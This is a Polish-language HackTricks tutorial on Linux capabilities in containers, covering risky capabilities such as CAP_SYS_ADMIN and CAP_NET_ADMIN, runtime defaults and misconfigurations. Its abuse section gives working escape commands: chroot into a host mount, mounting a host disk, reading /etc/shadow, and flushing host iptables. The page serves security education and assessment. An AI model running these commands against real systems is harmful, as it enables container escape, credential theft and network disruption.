# Linux Capabilities w Kontenerach

{{#include ../../../../banners/hacktricks-training.md}}

## Wprowadzenie

Linux capabilities są jednym z najważniejszych elementów container security, ponieważ odpowiadają na subtelne, ale fundamentalne pytanie: **co tak naprawdę oznacza „root” wewnątrz kontenera?** W zwykłym systemie Linux UID 0 historycznie oznaczał bardzo szeroki zestaw uprawnień. We współczesnych kernelach to uprawnienie jest podzielone na mniejsze jednostki nazywane capabilities. Proces może działać jako root, a mimo to nie mieć dostępu do wielu potężnych operacji, jeśli odpowiednie capabilities zostały usunięte.

Kontenery w dużym stopniu opierają się na tym rozróżnieniu. Wiele workloadów nadal jest uruchamianych jako UID 0 wewnątrz kontenera ze względów kompatybilności lub prostoty. Bez usuwania capabilities byłoby to zdecydowanie zbyt niebezpieczne. Po usunięciu capabilities proces root działający w kontenerze nadal może wykonywać wiele zwykłych zadań wewnątrz kontenera, jednocześnie nie mając dostępu do bardziej wrażliwych operacji kernela. Dlatego shell kontenera wyświetlający `uid=0(root)` nie oznacza automatycznie „host root” ani nawet „szerokich uprawnień do kernela”. To zestawy capabilities decydują o tym, ile faktycznie warta jest ta tożsamość root.

Pełny opis Linux capabilities oraz wiele przykładów ich abuse znajdziesz tutaj:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Działanie

Capabilities są śledzone w kilku zestawach, w tym permitted, effective, inheritable, ambient oraz bounding. W przypadku wielu assessments kontenerów dokładna semantyka kernela dotycząca każdego zestawu jest mniej istotna niż praktyczne pytanie końcowe: **jakie uprzywilejowane operacje ten proces może skutecznie wykonać teraz i jakie przyszłe uzyskanie dodatkowych uprawnień jest nadal możliwe?**

Jest to istotne, ponieważ wiele technik breakout to w rzeczywistości problemy z capabilities przedstawione jako problemy z kontenerami. Workload z `CAP_SYS_ADMIN` może uzyskać dostęp do ogromnej liczby funkcji kernela, których zwykły proces root w kontenerze nie powinien dotykać. Workload z `CAP_NET_ADMIN` staje się znacznie bardziej niebezpieczny, jeśli dodatkowo współdzieli host network namespace. Workload z `CAP_SYS_PTRACE` staje się znacznie ciekawszy, jeśli może widzieć procesy hosta dzięki współdzieleniu host PID. W Dockerze lub Podmanie może to wyglądać jako `--pid=host`; w Kubernetes zwykle występuje jako `hostPID: true`.

Innymi słowy, zestawu capabilities nie można oceniać w izolacji. Należy analizować go razem z namespaces, seccomp oraz polityką MAC.

## Lab

Bardzo bezpośrednim sposobem sprawdzenia capabilities wewnątrz kontenera jest:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Możesz również porównać bardziej restrykcyjny kontener z kontenerem, któremu dodano wszystkie capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Aby zobaczyć efekt ograniczonego dodatku, spróbuj usunąć wszystko i dodać z powrotem tylko jedną capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Te niewielkie eksperymenty pomagają pokazać, że runtime nie przełącza po prostu wartości logicznej o nazwie "privileged". Kształtuje on rzeczywistą powierzchnię uprawnień dostępną dla procesu.

## Capabilities wysokiego ryzyka

Chociaż wiele capabilities może mieć znaczenie w zależności od celu, kilka z nich regularnie okazuje się istotnych w analizie container escape.

**`CAP_SYS_ADMIN`** to capability, którą obrońcy powinni traktować z największą podejrzliwością. Często opisuje się ją jako "the new root", ponieważ odblokowuje ogromną ilość funkcjonalności, w tym operacje związane z mountami, działanie zależne od namespace'ów oraz wiele ścieżek kernela, które nigdy nie powinny być beztrosko udostępniane kontenerom. Jeśli kontener ma `CAP_SYS_ADMIN`, słaby seccomp i brak silnego ograniczenia MAC, wiele klasycznych ścieżek breakout staje się znacznie bardziej realistycznych.

**`CAP_SYS_PTRACE`** ma znaczenie, gdy istnieje widoczność procesów, szczególnie jeśli PID namespace jest współdzielony z hostem lub interesującymi sąsiednimi workloadami. Może zmienić widoczność w możliwość manipulacji.

**`CAP_NET_ADMIN`** i **`CAP_NET_RAW`** mają znaczenie w środowiskach skoncentrowanych na sieci. W odizolowanej sieci bridge mogą już być ryzykowne; we współdzielonym z hostem network namespace są znacznie groźniejsze, ponieważ workload może być w stanie rekonfigurować sieć hosta, sniffować, spoofować lub zakłócać lokalny przepływ ruchu.

**`CAP_SYS_MODULE`** jest zwykle katastrofalna w środowisku rootful, ponieważ ładowanie modułów kernela oznacza w praktyce kontrolę nad host kernelem. Prawie nigdy nie powinna pojawiać się w kontenerze ogólnego przeznaczenia.

## Użycie przez runtime

Docker, Podman, stosy oparte na containerd oraz CRI-O używają mechanizmów kontroli capabilities, ale ich wartości domyślne i interfejsy zarządzania się różnią. Docker udostępnia je bezpośrednio za pomocą flag takich jak `--cap-drop` i `--cap-add`. Podman udostępnia podobne mechanizmy i często dodatkowo korzysta z bezpieczeństwa zapewnianego przez rootless execution. Kubernetes udostępnia dodawanie i usuwanie capabilities za pośrednictwem `securityContext` Poda lub kontenera. Środowiska system-container, takie jak LXC/Incus, również opierają się na kontroli capabilities, ale szersza integracja tych systemów z hostem często skłania operatorów do bardziej agresywnego rozluźniania wartości domyślnych, niż miałoby to miejsce w środowisku app-container.

Ta sama zasada obowiązuje we wszystkich tych rozwiązaniach: capability, której technicznie można udzielić, niekoniecznie jest capability, której należy udzielić. Wiele rzeczywistych incydentów zaczyna się wtedy, gdy operator dodaje capability tylko dlatego, że workload nie działał przy bardziej restrykcyjnej konfiguracji, a zespół potrzebował szybkiej poprawki.

## Błędne konfiguracje

Najbardziej oczywistym błędem jest **`--cap-add=ALL`** w CLI w stylu Docker/Podman, ale nie jest to jedyny problem. W praktyce częstszym problemem jest nadawanie jednej lub dwóch wyjątkowo potężnych capabilities, szczególnie `CAP_SYS_ADMIN`, aby "uruchomić aplikację", bez zrozumienia konsekwencji dotyczących namespace'ów, seccomp i mountów. Innym częstym trybem awarii jest łączenie dodatkowych capabilities ze współdzieleniem host namespace. W Dockerze lub Podmanie może się to pojawić jako `--pid=host`, `--network=host` lub `--userns=host`; w Kubernetes równoważna ekspozycja zwykle występuje w ustawieniach workloadu, takich jak `hostPID: true` lub `hostNetwork: true`. Każda z tych kombinacji zmienia to, na co capability może faktycznie oddziaływać.

Często można również spotkać administratorów, którzy uważają, że skoro workload nie jest w pełni `--privileged`, to nadal podlega istotnym ograniczeniom. Czasami jest to prawdą, ale czasami effective posture jest już na tyle zbliżona do privileged, że różnica przestaje mieć znaczenie operacyjne.

## Nadużycie

Pierwszym praktycznym krokiem jest wyliczenie effective capability set i natychmiastowe przetestowanie działań zależnych od capabilities, które mogą mieć znaczenie dla escape lub dostępu do informacji o hoście:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Jeśli obecne jest `CAP_SYS_ADMIN`, najpierw przetestuj nadużycia oparte na `mount` oraz dostęp do systemu plików hosta, ponieważ jest to jeden z najczęstszych mechanizmów umożliwiających breakout:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Jeśli obecne jest `CAP_SYS_PTRACE` i kontener może zobaczyć interesujące procesy, sprawdź, czy tę capability można wykorzystać do inspekcji procesów:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Jeśli obecne jest `CAP_NET_ADMIN` lub `CAP_NET_RAW`, sprawdź, czy workload może manipulować widocznym stosem sieciowym lub przynajmniej gromadzić przydatne informacje o sieci:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Gdy test capability zakończy się powodzeniem, połącz jego wynik z sytuacją dotyczącą namespace. Capability, która w odizolowanym namespace wygląda jedynie na ryzykowną, może natychmiast stać się mechanizmem escape lub prymitywem do host-recon, jeśli kontener współdzieli również host PID, host network lub host mounts.

### Pełny przykład: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Jeśli kontener ma `CAP_SYS_ADMIN` oraz zapisywalny bind mount systemu plików hosta, na przykład `/host`, ścieżka escape jest często prosta:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Jeśli `chroot` zakończy się powodzeniem, polecenia są teraz wykonywane w kontekście głównego systemu plików hosta:
```bash
id
hostname
cat /etc/shadow | head
```
Jeśli `chroot` jest niedostępny, ten sam rezultat można często osiągnąć, wywołując plik binarny za pośrednictwem zamontowanego drzewa:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Pełny przykład: `CAP_SYS_ADMIN` + dostęp do urządzeń

Jeśli urządzenie blokowe z hosta jest udostępnione, `CAP_SYS_ADMIN` może umożliwić bezpośredni dostęp do systemu plików hosta:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Pełny przykład: `CAP_NET_ADMIN` + sieć hosta

To połączenie nie zawsze zapewnia bezpośrednio uprawnienia root na hoście, ale może całkowicie przekonfigurować stos sieciowy hosta:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Może to umożliwić denial of service, przechwytywanie ruchu lub dostęp do usług, które wcześniej były filtrowane.

## Kontrole

Celem kontroli capabilities jest nie tylko zrzucenie surowych wartości, ale także ustalenie, czy proces ma wystarczające uprawnienia, aby jego bieżąca przestrzeń nazw i sytuacja montowania stwarzały zagrożenie.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Co jest tutaj interesujące:

- `capsh --print` to najłatwiejszy sposób na wykrycie capabilities wysokiego ryzyka, takich jak `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` lub `cap_sys_module`.
- Wiersz `CapEff` w `/proc/self/status` informuje, które capabilities są faktycznie effective w tej chwili, a nie tylko które mogą być dostępne w innych zestawach.
- Zrzut capabilities staje się znacznie ważniejszy, jeśli container współdzieli również host PID, network lub user namespaces albo ma zapisywalne mounty hosta.

Po zebraniu surowych informacji o capabilities kolejnym krokiem jest ich interpretacja. Sprawdź, czy proces działa jako root, czy user namespaces są aktywne, czy współdzielone są host namespaces, czy seccomp jest enforcing oraz czy AppArmor lub SELinux nadal ograniczają proces. Sam zestaw capabilities to tylko część obrazu, ale często właśnie on wyjaśnia, dlaczego jeden container breakout działa, a inny kończy się niepowodzeniem przy tym samym pozornym punkcie wyjścia.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Typowe ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie zredukowany zestaw capabilities | Docker zachowuje domyślną allowlist capabilities i usuwa pozostałe | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Domyślnie zredukowany zestaw capabilities | Containery Podmana są domyślnie unprivileged i używają zredukowanego modelu capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Dziedziczy domyślne ustawienia runtime, chyba że zostaną zmienione | Jeśli nie określono `securityContext.capabilities`, container otrzymuje domyślny zestaw capabilities z runtime | `securityContext.capabilities.add`, pominięcie `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Zwykle ustawienia domyślne runtime | Efektywny zestaw zależy od runtime oraz specyfikacji Poda | tak jak w wierszu Kubernetes; bezpośrednia konfiguracja OCI/CRI również może jawnie dodawać capabilities |

W Kubernetes ważne jest to, że API nie definiuje jednego uniwersalnego domyślnego zestawu capabilities. Jeśli Pod nie dodaje ani nie usuwa capabilities, workload dziedziczy domyślne ustawienia runtime dla danego noda.
{{#include ../../../../banners/hacktricks-training.md}}
